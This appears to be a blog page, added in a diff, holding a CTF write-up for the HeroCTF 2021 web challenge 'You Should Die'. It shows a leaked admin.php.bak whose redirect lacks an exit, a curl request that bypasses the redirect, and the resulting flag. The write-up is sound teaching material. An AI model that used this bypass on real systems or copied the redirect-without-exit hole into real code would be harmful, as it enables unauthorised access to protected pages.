@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>WaletSec - 2021-04-26-You-should-die-HeroCTF.fr</title>
+        <link rel="stylesheet" href="../css/default.css" />
+        <link rel="stylesheet" href="../css/syntax.css" />
+    </head>
+    <body>
+        <header>
+            <div class="logo">
+                <a href="../">WaletSec</a>
+            </div>
+            <nav>
+                <a href="../">Home</a>
+                <a href="../about.html">About</a>
+                <a href="../contact.html">Contact</a>
+                <a href="../archive.html">Archive</a>
+            </nav>
+        </header>
+
+        <main role="main">
+            <h1>2021-04-26-You-should-die-HeroCTF.fr</h1>
+            <article>
+    <section class="header">
+        Posted on April 26, 2021
+        
+    </section>
+    <section>
+        <h1 id="you-should-die---heroctf.fr">You Should Die - HeroCTF.fr</h1>
+<h3 id="you-will-need">You will need</h3>
+<ul>
+<li>Web browser</li>
+<li>Curl command</li>
+</ul>
+<h3 id="solution">Solution</h3>
+<p>We go to the address given to us - <a href="http://chall1.heroctf.fr:9000/">http://chall1.heroctf.fr:9000/</a>. Here, if we open DevTools, we can find an interesting comment inside the <code>body</code> element.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="kw">&lt;body</span><span class="ot"> id=</span><span class="st">&quot;page-top&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>  <span class="co">&lt;!--</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="co">      For developper :</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="co">          Do not forget to remove admin.php.bak !</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="co">      </span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="co">      Regards,</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="co">      Security Team</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a><span class="co">  --&gt;</span></span></code></pre></div>
+<p>We have got the information that <code>admin.php.bak</code> is not removed, so we go there, and look at how an admin.php code looks like - <a href="http://chall1.heroctf.fr:9000/admin.php.bak">http://chall1.heroctf.fr:9000/admin.php.bak</a></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="kw">&lt;?php</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="kw">if</span> <span class="ot">(</span><span class="fu">session_status</span><span class="ot">()</span> == <span class="kw">PHP_SESSION_NONE</span><span class="ot">)</span> {</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a>    <span class="fu">session_start</span><span class="ot">();</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>}</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a><span class="kw">if</span> <span class="ot">(</span>!<span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$_SESSION</span><span class="ot">[</span><span class="st">&quot;logged&quot;</span><span class="ot">])</span> &amp;&amp; <span class="kw">$_SESSION</span><span class="ot">[</span><span class="st">&quot;logged&quot;</span><span class="ot">]</span> === <span class="kw">true</span><span class="ot">))</span> {</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a>    <span class="fu">header</span><span class="ot">(</span><span class="st">&quot;Location: /index.php?error=You are not admin !&quot;</span><span class="ot">);</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true"></a>}</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true"></a></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true"></a><span class="kw">echo</span> <span class="st">&quot;Flag : &quot;</span> . <span class="fu">getenv</span><span class="ot">(</span><span class="st">&quot;FLAG_MARK3TING&quot;</span><span class="ot">);</span></span></code></pre></div>
+<p>Here we can see that flag can be accessed under the <code>/admin.php</code>. Code checks if we are logged in an if we are not it <strong>redirects</strong> us to /index.php. Redirect is a key word here, because we can fetch this address with <code>curl</code>, which ignores <code>Location</code> header.</p>
+<pre><code>$ curl http://chall1.heroctf.fr:9000/admin.php
+Flag : Hero{r3d1r3c710n_c4n_b3_d4n63r0u5_57395379}</code></pre>
+<h3 id="flag">Flag</h3>
+<p>​​ Hero{<strong>r3d1r3c710n_c4n_b3_d4n63r0u5_57395379</strong>}</p>
+<h4 id="credits">Credits</h4>
+<ul>
+<li>Writeup by <a href="https://ctftime.org/user/93848">mble</a></li>
+<li>Solved by <a href="https://ctftime.org/user/85858">everl0stz</a>; <a href="https://ctftime.org/user/93848">mble</a></li>
+<li>WaletSec 2021</li>
+</ul>
+<h4 id="license">License</h4>
+<p><strong>CC BY 4.0</strong> WaletSec + mble</p>
+    </section>
+</article>
+
+        </main>
+
+        <footer>
+            <div>Source code available on 
+                <a href="https://github.com/WaletSec/waletsec.github.io">GitHub</a></div>
+            <div>Site proudly generated by
+                <a href="http://jaspervdj.be/hakyll">Hakyll</a></div>
+        </footer>
+    </body>
+</html>
